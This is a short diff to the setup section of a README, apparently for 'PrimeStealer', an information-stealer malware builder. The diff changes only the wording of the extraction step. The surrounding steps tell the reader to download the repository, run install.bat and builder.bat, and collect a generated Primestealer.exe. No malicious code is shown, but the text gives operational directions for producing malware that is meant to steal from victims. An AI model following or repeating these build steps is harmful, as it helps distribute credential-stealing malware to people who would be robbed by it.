@@ -72,7 +72,7 @@
 ### Setup
 
 1. [Download File](https://github.com/SheLuvDx/PrimeStealer/archive/refs/heads/main.zip)
-2. Extract zip
+2. Extract Zip or Rar
 3. First install reqiured packages by double clicking `install.bat` file
 4. Run the builder by double clicking the `builder.bat` file
 5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `Primestealer.exe`
